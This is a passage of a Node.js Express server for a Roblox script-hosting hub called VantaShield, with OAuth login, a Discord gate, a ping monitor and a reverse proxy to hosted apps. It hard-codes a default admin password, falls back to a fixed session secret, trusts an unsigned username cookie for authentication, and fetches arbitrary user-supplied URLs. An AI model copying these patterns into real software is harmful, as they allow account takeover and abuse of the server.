const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const http = require('http');
const app = express();

// ===== THÊM: OAuth + Session + Giám sát Ping =====
const session = require('express-session');
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const GitHubStrategy = require('passport-github2').Strategy;
const DiscordStrategy = require('passport-discord').Strategy;

const DISCORD_INVITE_URL = 'https://discord.gg/C72jAuytN';
const DISCORD_INVITE_CODE = 'C72jAuytN';
let REQUIRED_GUILD_ID = process.env.DISCORD_GUILD_ID || null;

// Khởi tạo lưu trữ dữ liệu giám sát Ping
const PING_FILE = './vantashield_ping.json';
let pingDb = new Map();
try { if (fs.existsSync(PING_FILE)) pingDb = new Map(Object.entries(JSON.parse(fs.readFileSync(PING_FILE,'utf8')))); } catch(e){}
function savePing(){ fs.writeFileSync(PING_FILE, JSON.stringify(Object.fromEntries(pingDb))); }
const PING_LIMIT_PER_USER = 100;

async function doFetch(url){
  const fetchFn = global.fetch || (await import('node-fetch')).default;
  return fetchFn(url, { method: 'GET', headers: { 'User-Agent': 'VantaShield-Ping/1.0' }, redirect: 'follow' });
}
async function pingAll(){
  const jobs = [];
  pingDb.forEach((entry) => {
    jobs.push((async () => {
      const start = Date.now();
      try {
        const r = await doFetch(entry.url);
        entry.lastStatus = r.status;
        entry.lastOk = r.ok;
        entry.lastTime = Date.now() - start;
        entry.lastCheck = Date.now();
        entry.totalPings = (entry.totalPings||0)+1;
        if (r.ok) entry.successCount = (entry.successCount||0)+1;
      } catch(e){
        entry.lastStatus = 0;
        entry.lastOk = false;
        entry.lastTime = Date.now() - start;
        entry.lastCheck = Date.now();
        entry.lastError = String(e.message||e).slice(0,120);
        entry.totalPings = (entry.totalPings||0)+1;
      }
    })());
  });
  await Promise.allSettled(jobs);
  savePing();
}
setInterval(() => { pingAll().catch(()=>{}); }, 10000);

// Lấy thông tin user session thống nhất
function getSessionUser(req){
  const cookieUser = getCookie(req, 'user_session');
  if (cookieUser) return cookieUser;
  if (req.user && req.user.username) return req.user.username;
  return null;
}
// ===== KẾT THÚC KHỐI OAUTH & PING =====


// ============================================================================
// HỆ THỐNG REVERSE PROXY NỘI BỘ (KHẮC PHỤC LỖI PORT TRÊN RENDER)
// Phải đặt trước body-parser để không bị lỗi stream
// ============================================================================
let apisDb = new Map();

app.use('/app/:name', (req, res) => {
    const name = req.params.name;
    const api = Array.from(apisDb.values()).find(a => a.name === name);
    
    if (!api) {
        return res.status(404).send(`
            <div style="background:#000;color:#fff;font-family:monospace;padding:20px;text-align:center;border:1px solid #333;">
                <h2>404 - KHÔNG TÌM THẤY WEB</h2>
                <p>Web [${name}] không tồn tại trên hệ thống.</p>
            </div>
        `);
    }
    
    if (api.status !== 'ONLINE') {
        return res.status(503).send(`
            <div style="background:#000;color:#aaa;font-family:monospace;padding:20px;text-align:center;border:1px solid #333;">
                <h2>503 - WEB ĐANG TẮT (OFFLINE)</h2>
                <p>Web [${name}] hiện đang không hoạt động. Vui lòng vào Dashboard bật lại.</p>
            </div>
        `);
    }

    // Proxy request tới port nội bộ
    const targetPath = req.url || '/';
    const options = {
        hostname: '127.0.0.1',
        port: api.port,
        path: targetPath,
        method: req.method,
        headers: { ...req.headers, host: `127.0.0.1:${api.port}` }
    };

    const proxyReq = http.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
    });

    req.pipe(proxyReq, { end: true });

    proxyReq.on('error', (e) => {
        console.error(`Proxy Error [${name}]:`, e);
        res.status(502).send('502 - Bad Gateway (Lỗi kết nối tới Server con)');
    });
});

// ============================================================================
// CẤU HÌNH HỆ THỐNG EXPRESS
// ============================================================================
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// Cấu hình Session & Passport để đăng nhập bằng bên thứ ba
app.use(session({
  secret: process.env.SESSION_SECRET || 'vantashield-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 1000 * 60 * 60 * 24 * 7 }
}));
app.use(passport.initialize());
app.use(passport.session());
passport.serializeUser((u, done) => done(null, u));
passport.deserializeUser((u, done) => done(null, u));

function registerOAuthUser(profile, provider){
  const uname = (provider + '_' + (profile.username || profile.displayName || profile.id)).toLowerCase().replace(/[^a-z0-9_]/g,'').slice(0,32);
  if (!usersDb.has(uname)) { usersDb.set(uname, { password: null, provider, providerId: profile.id, avatar: (profile.photos && profile.photos[0] && profile.photos[0].value) || null }); saveUsers(); }
  return uname;
}

if (process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET) {
  passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: (process.env.PUBLIC_URL || '') + '/auth/google/callback'
  }, (at, rt, profile, done) => {
    const username = registerOAuthUser(profile, 'google');
    done(null, { username, provider: 'google', profile });
  }));
  app.get('/auth/google', passport.authenticate('google', { scope: ['profile','email'] }));
  app.get('/auth/google/callback', passport.authenticate('google', { failureRedirect: '/login?error=Google login failed' }), (req,res) => {
    res.cookie('user_session', req.user.username, { maxAge: 1000*60*60*24*7, httpOnly: true });
    res.redirect('/discord-verify');
  });
}

if (process.env.GITHUB_CLIENT_ID && process.env.GITHUB_CLIENT_SECRET) {
  passport.use(new GitHubStrategy({
    clientID: process.env.GITHUB_CLIENT_ID,
    clientSecret: process.env.GITHUB_CLIENT_SECRET,
    callbackURL: (process.env.PUBLIC_URL || '') + '/auth/github/callback'
  }, (at, rt, profile, done) => {
    const username = registerOAuthUser(profile, 'github');
    done(null, { username, provider: 'github', profile });
  }));
  app.get('/auth/github', passport.authenticate('github', { scope: ['user:email'] }));
  app.get('/auth/github/callback', passport.authenticate('github', { failureRedirect: '/login?error=GitHub login failed' }), (req,res) => {
    res.cookie('user_session', req.user.username, { maxAge: 1000*60*60*24*7, httpOnly: true });
    res.redirect('/discord-verify');
  });
}

if (process.env.DISCORD_CLIENT_ID && process.env.DISCORD_CLIENT_SECRET) {
  passport.use(new DiscordStrategy({
    clientID: process.env.DISCORD_CLIENT_ID,
    clientSecret: process.env.DISCORD_CLIENT_SECRET,
    callbackURL: (process.env.PUBLIC_URL || '') + '/auth/discord/callback',
    scope: ['identify','guilds']
  }, (at, rt, profile, done) => {
    const username = registerOAuthUser(profile, 'discord');
    const guilds = profile.guilds || [];
    done(null, { username, provider: 'discord', profile, guilds, accessToken: at });
  }));
  app.get('/auth/discord', passport.authenticate('discord'));
  app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/login?error=Discord login failed' }), async (req,res) => {
    try {
      if (!REQUIRED_GUILD_ID) {
        const fetchFn = global.fetch || (await import('node-fetch')).default;
        const inv = await fetchFn('https://discord.com/api/v10/invites/' + DISCORD_INVITE_CODE).then(r=>r.json()).catch(()=>null);
        if (inv && inv.guild && inv.guild.id) REQUIRED_GUILD_ID = inv.guild.id;
      }
      const inGuild = REQUIRED_GUILD_ID ? (req.user.guilds||[]).some(g => g.id === REQUIRED_GUILD_ID) : true;
      req.session.discordVerified = inGuild;
      res.cookie('user_session', req.user.username, { maxAge: 1000*60*60*24*7, httpOnly: true });
      if (inGuild) return res.redirect('/');
      return res.redirect('/discord-gate');
    } catch(e){
      return res.redirect('/discord-gate');
    }
  });
}

// Cổng xác minh thành viên Discord Server trước khi dùng web
app.get('/discord-gate', (req,res) => {
  res.send(baseHTML(`
    <section class="hero">
      <div class="hero-badge"><i class="ph-fill ph-discord-logo"></i> DISCORD GATE</div>
      <h1><span class="line2">JOIN DISCORD TO CONTINUE</span></h1>
    </section>
    <div class="center-card-wrap" style="max-width:520px;">
      <div class="quick-card" style="text-align:center;">
        <div style="font-size:80px; color:#5865F2; margin-bottom:10px;"><i class="ph-fill ph-discord-logo"></i></div>
        <p style="color:var(--vs-text-light); margin-bottom:20px;">Bạn cần tham gia server Discord của chúng tôi trước khi sử dụng VantaShield.</p>
        <a href="${DISCORD_INVITE_URL}" target="_blank" class="btn-save" style="background:#5865F2; color:#fff; margin-bottom:12px;"><i class="ph-fill ph-discord-logo"></i> JOIN DISCORD SERVER</a>
        <a href="/auth/discord" class="btn-save" style="background:var(--vs-white); color:var(--vs-black);"><i class="ph ph-arrow-clockwise"></i> ĐÃ VÀO, KIỂM TRA LẠI</a>
        <p style="color:var(--vs-text); font-size:12px; margin-top:15px;">Sau khi bạn Join Discord xong, bấm "Kiểm tra lại".</p>
      </div>
    </div>
  `, getSessionUser(req)));
});

app.get('/discord-verify', (req,res)=>{
  if (req.session && req.session.discordVerified) return res.redirect('/');
  res.redirect('/auth/discord');
});

// Điều phối bảo mật Discord Gate
const OPEN_PATHS = ['/discord-gate','/discord-verify','/auth/','/logout','/favicon.ico'];
app.use((req,res,next) => {
  if (req.path.startsWith('/app/')) return next();
  if (req.path.startsWith('/v1/')) return next();
  if (req.path.match(/^\/[^/]+\/[^/]+\/refs\/heads\/main\//)) return next();
  if (OPEN_PATHS.some(p => req.path.startsWith(p))) return next();
  if (req.session && req.session.discordVerified) return next();
  
  const u = getSessionUser(req);
  if (u && !(req.session && req.session.discordVerified)) {
    if (req.path === '/discord-gate') return next();
    const RESTRICTED = ['/dashboard','/api-hosting','/ping','/chat-vn','/chat-global','/edit','/delete','/download','/create'];
    if (RESTRICTED.some(p => req.path.startsWith(p))) return res.redirect('/discord-gate');
  }
  next();
});


// ============================================================================
// KHỞI TẠO CƠ SỞ DỮ LIỆU ĐỊA PHƯƠNG
// ============================================================================
const DB_FILE = './vantashield_scripts.json';
const USERS_FILE = './vantashield_users.json';
const APIS_FILE = './vantashield_apis.json';
const CHAT_FILE = './vantashield_chat.json';

let db = new Map();
let usersDb = new Map();
let chatDb = { vn: [], global: [] };

const loadJSON = (file, fallback) => {
    if (fs.existsSync(file)) {
        try { return JSON.parse(fs.readFileSync(file, 'utf8')); } 
        catch(e) { console.error("Error reading " + file, e); return fallback; }
    }
    return fallback;
};

// Khôi phục dữ liệu từ bộ nhớ cục bộ
db = new Map(Object.entries(loadJSON(DB_FILE, {})));
usersDb = new Map(Object.entries(loadJSON(USERS_FILE, {})));
chatDb = loadJSON(CHAT_FILE, { vn: [], global: [] });

let loadedApis = loadJSON(APIS_FILE, {});
apisDb = new Map(Object.entries(loadedApis));
apisDb.forEach((api, key) => {
    api.status = 'OFFLINE';
    api.pid = null;
    apisDb.set(key, api);
});
saveApis();

// Tài khoản Admin mặc định
if (!usersDb.has('master1')) {
    usersDb.set('master1', { password: 'duykhanh2014' });
    saveUsers();
}

// Các tác vụ ghi dữ liệu vào tệp tin
function saveDb() { fs.writeFileSync(DB_FILE, JSON.stringify(Object.fromEntries(db))); }
function saveUsers() { fs.writeFileSync(USERS_FILE, JSON.stringify(Object.fromEntries(usersDb))); }
function saveApis() { fs.writeFileSync(APIS_FILE, JSON.stringify(Object.fromEntries(apisDb))); }
function saveChat() { fs.writeFileSync(CHAT_FILE, JSON.stringify(chatDb)); }

// Tiện ích phụ trợ
function getCookie(req, name) {
    const cookies = req.headers.cookie || '';
    const match = cookies.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
}

function escapeHTML(str) {
    if (!str) return '';
    return str.replace(/[&<>'"]/g, tag => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;'
    }[tag]));
}

// BẢO MẬT CAO NHẤT: KHÔNG CHO PHÉP BẤT KỲ ĐƯỜNG BYPASS NÀO BẰNG QUERY TRÊN TRÌNH DUYỆT
function isRobloxExecutor(req) {
    const userAgent = (req.headers['user-agent'] || '').toLowerCase();
    return userAgent.includes('roblox') || 
           userAgent.includes('rblx') || 
           !userAgent.includes('mozilla') ||
           userAgent.includes('synapse') ||
           userAgent.includes('krnl') ||
           userAgent.includes('fluxus') ||
           userAgent.includes('delta') ||
           userAgent.includes('hydrogen') ||
           userAgent.includes('codex') ||
           userAgent.includes('arceus');
}

function getFreePort() {
    let maxPort = 8000;
    apisDb.forEach(api => {
        if (api.port && api.port >= maxPort) maxPort = api.port + 1;
    });
    return maxPort;
}

const runningProcesses = {};

// ============================================================================
// 1. GIAO DIỆN CHUNG & CLIENT-SIDE SCRIPTS
// ============================================================================
const style = `
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap');

body.mobf-root {
  --vs-bg: #030303; 
  --vs-card: #0a0a0a; 
  --vs-border: #1f1f1f;
  --vs-border-hover: #333333;
  --vs-text: #888888;
  --vs-text-light: #e0e0e0;
  --vs-white: #ffffff;
  --vs-black: #000000;
  
  background: var(--vs-bg); color: var(--vs-text-light);
  font-family: "JetBrains Mono", ui-monospace, monospace;
  min-height: 100vh; margin: 0; overflow-x: hidden; position: relative;
}

.mobf-root::before {
  content: ""; position: fixed; inset: 0;
  background-image: linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
  background-size: 40px 40px; animation: gridMove 20s linear infinite; pointer-events: none; z-index: 0;
}
@keyframes gridMove { to { transform: translateY(40px); } }

/* Hiệu ứng mờ nền */
.orb { position: fixed; border-radius: 50%; filter: blur(100px); opacity: 0.03; pointer-events: none; z-index: 0; animation: orbFloat 10s ease-in-out infinite; }
.orb1 { width: 500px; height: 500px; background: #ffffff; top: -100px; left: -100px; }
.orb2 { width: 450px; height: 450px; background: #ffffff; bottom: -150px; right: -100px; animation-delay: -3s; }
.orb3 { width: 300px; height: 300px; background: #ffffff; top: 40%; left: 30%; animation-delay: -6s; opacity: 0.01; }
@keyframes orbFloat { 0%,100%{ transform:translate(0,0) scale(1);} 50%{ transform:translate(30px,-30px) scale(1.1);} }

.mobf-nav {
  position: sticky; top: 0; z-index: 100; display: flex; align-items: center; justify-content: space-between;
  padding: 16px 32px; background: rgba(3, 3, 3, 0.85); backdrop-filter: blur(16px); border-bottom: 1px solid var(--vs-border);
}
.nav-logo {
  font-family: "Orbitron", sans-serif; font-size: 22px; font-weight: 900; letter-spacing: 2px;
  color: var(--vs-white); text-decoration: none; display: flex; align-items: center; gap: 8px;
}
.menu-toggle { font-size: 24px; background: none; border: none; color: var(--vs-white); cursor: pointer; transition: 0.3s; display: flex; align-items: center;}
.menu-toggle:hover { color: var(--vs-text); transform: scale(1.1); }

.sidebar {
  position: fixed; top: 0; left: -300px; width: 280px; height: 100vh; background: #050505;
  border-right: 1px solid var(--vs-border); z-index: 999; padding: 30px 20px; box-sizing: border-box;
  transition: all 0.4s cubic-bezier(0.77, 0, 0.175, 1); box-shadow: 10px 0 30px rgba(0,0,0,0.9);
}
.sidebar.active { left: 0; }
.sidebar-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; font-family: "Orbitron"; font-weight: bold; color: var(--vs-text-light); }
.sidebar-close { background: none; border: none; color: var(--vs-text); font-size: 20px; cursor: pointer; display: flex;}
.sidebar-close:hover { color: var(--vs-white); }

.sidebar-menu a { display: flex; align-items: center; gap: 12px; padding: 14px 18px; color: var(--vs-text); text-decoration: none; border-radius: 8px; margin-bottom: 5px; transition: 0.3s; font-weight: bold;}
.sidebar-menu a i { font-size: 18px; }
.sidebar-menu a:hover { background: rgba(255, 255, 255, 0.05); color: var(--vs-white); }
.user-badge { background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; font-size: 12px; margin-bottom: 20px; border: 1px solid var(--vs-border); text-align: center; color: var(--vs-text);}

.hero { position: relative; z-index: 1; text-align: center; padding: 40px 20px 20px; max-width: 860px; margin: 0 auto; }
.hero-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 16px; border: 1px solid var(--vs-border-hover); border-radius: 20px; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; color: var(--vs-text-light); margin-bottom: 20px; background: rgba(255,255,255,0.02); }
.hero h1 { font-family: "Orbitron", sans-serif; font-size: clamp(26px, 5vw, 42px); font-weight: 900; letter-spacing: 2px; margin: 0 0 10px 0; color: var(--vs-white);}

.center-card-wrap { position: relative; z-index: 1; max-width: 800px; margin: 0 auto 80px; padding: 0 20px; }
.quick-card { background: var(--vs-card); border: 1px solid var(--vs-border); border-radius: 12px; padding: 32px; position: relative; overflow: hidden; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }

.header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-wrap: wrap; gap: 10px;}
.field-label { font-size: 13px; letter-spacing: 2px; text-transform: uppercase; color: var(--vs-text-light); font-weight: bold; margin: 0 0 10px 0; display: block;}

.quick-card input[type="text"], .quick-card input[type="password"] { width: 100%; padding: 14px; background: var(--vs-black); border: 1px solid var(--vs-border); border-radius: 8px; color: var(--vs-white); font-family: "JetBrains Mono", monospace; font-size: 14px; box-sizing: border-box; outline: none; transition: all .3s; margin-bottom: 20px; }
.quick-card input:focus, .quick-card textarea:focus { border-color: var(--vs-text); box-shadow: 0 0 15px rgba(255, 255, 255, 0.05); }

.btn-upload { background: rgba(255,255,255,0.02); color: var(--vs-text); border: 1px dashed var(--vs-border-hover); padding: 10px 15px; border-radius: 8px; font-size: 12px; cursor: pointer; transition: all 0.3s; font-family: "Orbitron"; display: inline-flex; align-items: center; gap: 8px; font-weight: bold; }
.btn-upload:hover { background: rgba(255,255,255,0.05); color: var(--vs-white); border-color: var(--vs-text); }
input[type="file"] { display: none; }

.quick-card textarea { width: 100%; height: 250px; background: var(--vs-black); border: 1px solid var(--vs-border); border-radius: 8px; color: var(--vs-text-light); font-family: "JetBrains Mono", monospace; font-size: 13px; padding: 14px; box-sizing: border-box; outline: none; transition: all .3s; resize: none; margin-bottom: 15px; }

.btn-save { width: 100%; padding: 16px; border: none; border-radius: 8px; font-family: "Orbitron"; font-size: 15px; font-weight: 900; letter-spacing: 2px; cursor: pointer; color: var(--vs-black); background: var(--vs-white); transition: all .2s; text-decoration:none; display:flex; align-items:center; justify-content:center; gap: 10px; box-sizing:border-box;}
.btn-save:hover { background: var(--vs-text-light); transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 255, 255, 0.15); }

.result-box { margin-top: 15px; padding: 20px; border-radius: 8px; background: var(--vs-black); border: 1px solid var(--vs-border); text-align: left; position: relative;}
.copy-btn { position: absolute; top: 10px; right: 10px; background: var(--vs-border); color: var(--vs-text-light); border: 1px solid var(--vs-border-hover); padding: 8px 16px; border-radius: 6px; font-size: 12px; font-weight: bold; cursor: pointer; font-family: "Orbitron"; transition: 0.3s; }
.copy-btn:hover { background: var(--vs-white); color: var(--vs-black); }
.code-preview { color: var(--vs-text-light); word-break: break-all; font-size: 13px; line-height: 1.5; margin-top: 10px; white-space: pre-wrap; }

/* BẢNG QUẢN LÝ */
.manage-wrap { overflow-x: auto; width: 100%; }
.manage-table { width: 100%; min-width: 600px; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
.manage-table th { background: rgba(255,255,255,0.02); color: var(--vs-text-light); padding: 12px; text-align: left; border-bottom: 1px solid var(--vs-border); font-family: "Orbitron"; }
.manage-table td { padding: 14px 12px; border-bottom: 1px solid rgba(255,255,255,0.02); vertical-align: middle; }
.btn-action { padding: 6px 10px; border: 1px solid var(--vs-border); border-radius: 6px; font-family: "JetBrains Mono"; cursor: pointer; font-weight: bold; font-size: 11px; text-decoration: none; margin-right: 5px; display: inline-flex; align-items:center; gap:6px; margin-bottom: 5px; background: var(--vs-black); color: var(--vs-text-light); transition: 0.2s;}
.btn-action:hover { border-color: var(--vs-text); color: var(--vs-white); }
.btn-delete:hover { border-color: #ef4444; color: #ef4444; }
.badge-admin { background: var(--vs-white); color: var(--vs-black); padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; }

/* KHU VỰC TRÒ CHUYỆN */
.chat-box { background: var(--vs-black); border: 1px solid var(--vs-border); border-radius: 8px; height: 400px; display: flex; flex-direction: column; overflow: hidden; }
.chat-messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; scroll-behavior: smooth;}
.chat-msg { max-width: 80%; padding: 12px 16px; border-radius: 8px; font-size: 14px; line-height: 1.4; word-break: break-word; }
.msg-bot { background: var(--vs-card); border: 1px solid var(--vs-border); align-self: flex-start; border-bottom-left-radius: 2px; color: var(--vs-text); }
.msg-user { background: var(--vs-border); border: 1px solid var(--vs-border-hover); align-self: flex-end; border-bottom-right-radius: 2px; color: var(--vs-white); }
.chat-input-area { display: flex; gap: 10px; padding: 15px; background: rgba(255,255,255,0.02); border-top: 1px solid var(--vs-border); align-items: center; }
.btn-attach { background: var(--vs-black); border: 1px solid var(--vs-border); color: var(--vs-text-light); width: 45px; height: 45px; border-radius: 8px; font-size: 20px; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: 0.3s; }
.btn-attach:hover { background: var(--vs-white); color: var(--vs-black); }
.chat-input { flex: 1; background: var(--vs-black); border: 1px solid var(--vs-border); border-radius: 8px; color: var(--vs-white); padding: 0 15px; height: 45px; font-family: "JetBrains Mono"; outline: none; transition: 0.3s;}
.chat-input:focus { border-color: var(--vs-text); }
.btn-send { background: var(--vs-white); border: none; color: var(--vs-black); padding: 0 20px; height: 45px; border-radius: 8px; font-family: "Orbitron"; font-weight: bold; cursor: pointer; transition: 0.3s; display:flex; align-items:center; gap:8px;}
.btn-send:hover { background: var(--vs-text-light); }

/* TERMINAL DEPLOYMENT SYSTEM */
#loader-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 99999; flex-direction: column; justify-content: center; align-items: center; }
.terminal-window { width: 90%; max-width: 600px; background: #000; border: 1px solid var(--vs-border-hover); border-radius: 8px; overflow: hidden; box-shadow: 0 0 30px rgba(255,255,255,0.05); }
.terminal-header { background: #111; padding: 10px; display: flex; gap: 8px; border-bottom: 1px solid #222; }
.terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
.terminal-body { padding: 20px; font-family: 'JetBrains Mono', monospace; font-size: 14px; color: var(--vs-text-light); min-height: 250px; display: flex; flex-direction: column; gap: 10px; }
.term-line { opacity: 0; animation: fadeIn 0.3s forwards; }
.blink { animation: blinker 1s linear infinite; }
@keyframes fadeIn { to { opacity: 1; } }
@keyframes blinker { 50% { opacity: 0; } }

/* MÀN HÌNH TROLL ANTI-SKID */
.cyber-text-alert { font-family: 'Orbitron', sans-serif; font-size: 13px; font-weight: bold; color: var(--vs-white); text-shadow: 0 0 8px rgba(255,255,255,0.3); letter-spacing: 1px; animation: pulseGlow 2s infinite; display:flex; align-items:center; gap:8px;}
@keyframes pulseGlow { 0%, 100% { opacity: 1; text-shadow: 0 0 8px rgba(255,255,255,0.3); } 50% { opacity: 0.7; text-shadow: 0 0 15px rgba(255,255,255,0.6); } }
.troll-screen { position: fixed; inset: 0; z-index: 999999; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
.troll-text { font-family: 'Orbitron', sans-serif; font-size: clamp(38px, 8vw, 90px); font-weight: 900; color: #fff; text-shadow: 2px 2px 0px #333; animation: shake 0.1s infinite; margin-bottom: 15px; }
.troll-sub { font-size: 20px; background: var(--vs-card); color: #ccc; padding: 12px 25px; font-weight: bold; border-radius: 8px; border: 1px solid #333; }
@keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -2px); } 100% { transform: translate(2px, -2px); } }
.alert { padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid var(--vs-border); color: var(--vs-text-light); border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; }
.alert-success { background: rgba(255,255,255,0.1); border: 1px solid var(--vs-text); color: var(--vs-white); }

/* ĐIỀU KHOẢN */
.tos-list { text-align: left; margin-top: 20px; }
.tos-item { margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid var(--vs-border); }
.tos-title { font-family: 'Orbitron'; font-size: 16px; color: var(--vs-white); margin-bottom: 8px; font-weight: bold; }
.tos-title span { color: var(--vs-text); margin-right: 8px; }
.tos-desc { font-size: 14px; color: var(--vs-text); line-height: 1.6; }
</style>

<!-- Phosphor Icons Library -->
<script src="https://unpkg.com/@phosphor-icons/web"></script>

<script>
function toggleSidebar() { document.getElementById('sidebarNav').classList.toggle('active'); }
function handleFileUpload(event) {
    const file = event.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = function(e) { document.getElementById('codeArea').value = e.target.result; };
    reader.readAsText(file);
}
function copyText(elementId, btnElement) {
    const textToCopy = document.getElementById(elementId).innerText;
    const textArea = document.createElement("textarea");
    textArea.value = textToCopy; document.body.appendChild(textArea); textArea.select();
    try {
        document.execCommand('copy');
        btnElement.innerHTML = '<i class="ph ph-check"></i> COPIED!'; 
        btnElement.style.background = 'var(--vs-white)'; btnElement.style.color = 'var(--vs-black)';
        setTimeout(() => { btnElement.innerHTML = '<i class="ph ph-copy"></i> COPY'; btnElement.style.background = 'var(--vs-border)'; btnElement.style.color = 'var(--vs-text-light)'; }, 2000);
    } catch (err) { console.error(err); }
    document.body.removeChild(textArea);
}

function copyApiLink(projectName, btnElement) {
    const url = window.location.origin + '/app/' + projectName;
    const textArea = document.createElement("textarea");
    textArea.value = url; document.body.appendChild(textArea); textArea.select();
    try {
        document.execCommand('copy');
        btnElement.innerHTML = '<i class="ph ph-check"></i> COPIED!'; 
        btnElement.style.borderColor = 'var(--vs-white)'; btnElement.style.color = 'var(--vs-white)';
        setTimeout(() => { btnElement.innerHTML = '<i class="ph ph-copy"></i> COPY LINK'; btnElement.style.borderColor = 'var(--vs-border)'; btnElement.style.color = 'var(--vs-text-light)'; }, 2000);
    } catch(e) {}
    document.body.removeChild(textArea);
}

function openApiLink(projectName) {
    const url = window.location.origin + '/app/' + projectName;
    window.open(url, '_blank');
}

// ============================================================================
// HỆ THỐNG TỰ ĐỘNG DỊCH TIẾNG VIỆT
// ============================================================================
const viDict = {
    "NAVIGATION": "ĐIỀU HƯỚNG",
    "Logged in as:": "Đăng nhập với tư cách:",
    "Not Logged In": "Chưa đăng nhập",
    "Log in to securely save, edit, and manage your scripts globally.": "Đăng nhập để lưu, chỉnh sửa và quản lý script của bạn an toàn.",
    "Login": "Đăng Nhập",
    "Create Account": "Tạo Tài Khoản",
    "Creator Home": "Trang Chủ",
    "Script Management": "Quản Lý Mã Nguồn",
    "Tạo Web (Hosting)": "Tạo Web (Hosting)",
    "VN Chat": "Trò Chuyện VN",
    "Global Chat": "Trò Chuyện Toàn Cầu",
    "Terms of Service": "Điều Khoản Dịch Vụ",
    "Logout": "Đăng Xuất",
    "BRAND NEW RAW SYSTEM WITH ANTI-SKID": "HỆ THỐNG RAW MỚI TÍCH HỢP CHỐNG ĂN CẮP",
    "RAW HUB CODESHARE": "CHIA SẺ MÃ NGUỒN",
    "SCRIPT CONTENT (LUA / TXT)": "NỘI DUNG SCRIPT (LUA / TXT)",
    "SECURE & GENERATE RAW LINK": "BẢO MẬT & TẠO LINK RAW",
    "Type your message here...": "Nhập tin nhắn của bạn...",
    "SEND": "GỬI",
    "Attach File/Image": "Đính Kèm File/Ảnh",
    "SYSTEM LOGIN": "ĐĂNG NHẬP HỆ THỐNG",
    "USERNAME": "TÊN ĐĂNG NHẬP",
    "PASSWORD": "MẬT KHẨU",
    "ACCESS SYSTEM": "TRUY CẬP HỆ THỐNG",
    "Enter username...": "Nhập tài khoản...",
    "Enter password...": "Nhập mật khẩu..."
};

async function autoTranslateToVN() {
    try {
        let isVN = false;
        if (Intl.DateTimeFormat().resolvedOptions().timeZone === 'Asia/Ho_Chi_Minh') isVN = true;
        
        if (!isVN) {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data.country === 'VN') isVN = true;
        }

        if (isVN) {
            const walk = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
            let node;
            while(node = walk.nextNode()) {
                let text = node.nodeValue.trim();
                if(viDict[text]) {
                    node.nodeValue = node.nodeValue.replace(text, viDict[text]);
                }
            }
            document.querySelectorAll('input, textarea').forEach(el => {
                if(el.placeholder && viDict[el.placeholder]) el.placeholder = viDict[el.placeholder];
            });
        }
    } catch(e) { console.log("Translation check bypassed."); }
}

document.addEventListener('DOMContentLoaded', autoTranslateToVN);
</script>
`;

const baseHTML = (content, userSession = null) => {
    const isAdmin = userSession === 'master1';
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VantaShield.com | Protected Hub</title>
    ${style}
</head>
<body class="mobf-root">
    <div class="orb orb1"></div><div class="orb orb2"></div><div class="orb orb3"></div>
    
    <nav class="mobf-nav">
        <a href="/" class="nav-logo"><i class="ph-fill ph-shield-check"></i> VANTASHIELD.COM</a>
        <button class="menu-toggle" onclick="toggleSidebar()"><i class="ph ph-list"></i></button>
    </nav>

    <div class="sidebar" id="sidebarNav">
        <div class="sidebar-header">
            <span>NAVIGATION</span>
            <button class="sidebar-close" onclick="toggleSidebar()"><i class="ph ph-x"></i></button>
        </div>
        ${userSession ? `
            <div class="user-badge">
                <div style="display:flex; justify-content:center; align-items:center; gap:6px; margin-bottom:8px;">
                    <i class="ph-fill ph-check-circle" style="color: var(--vs-white);"></i> Logged in as:
                </div>
                <b style="color:var(--vs-white); font-size: 16px; display:flex; justify-content:center; align-items:center; gap:6px;">
                    ${escapeHTML(userSession).toUpperCase()} ${isAdmin ? '<i class="ph-fill ph-crown"></i>' : ''}
                </b>
            </div>
            <div class="sidebar-menu">
                <a href="/"><i class="ph ph-house"></i> Creator Home</a>
                <a href="/dashboard"><i class="ph ph-file-code"></i> Script Management</a>
